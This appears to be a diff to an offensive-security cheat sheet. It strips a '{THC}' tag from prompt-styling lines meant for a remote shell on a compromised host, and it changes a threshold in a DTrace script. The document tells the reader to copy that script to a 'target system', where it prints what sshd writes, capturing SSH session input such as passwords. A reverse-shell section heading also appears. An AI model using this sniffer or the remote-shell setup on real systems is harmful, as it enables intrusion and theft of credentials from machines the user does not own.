@@ -324,7 +324,7 @@ thcssh()
 {
     local ttyp
     echo -e "\e[0;35mTHC says: pimp up your prompt: Cut & Paste the following into your remote shell:\e[0;36m"
-    echo -e "PS1='"'{THC} \[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'\e[0m"
+    echo -e "PS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'\e[0m"
     ttyp=$(stty -g)
     stty raw -echo opost
     [[ $(ssh -V 2>&1) == OpenSSH_[67]* ]] && a="no"
@@ -1418,7 +1418,7 @@ export TERM=xterm-256color
 reset
 stty rows 24 columns 120
 # Pimp up your prompt
-PS1='{THC} USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
+PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
 ```
 
 <a id="reverse-shell-socat"></a>
@@ -1757,7 +1757,7 @@ Copy this "D Script" to the target system to a file named `d`:
 #pragma D option quiet
 inline string NAME = "sshd";
 syscall::write:entry
-/(arg0 >= 7) && (arg2 <= 16) && (execname == NAME)/
+/(arg0 >= 5) && (arg2 <= 16) && (execname == NAME)/
 { printf("%d: %s\n", pid, stringof(copyin(arg1, arg2))); }
 ```
 
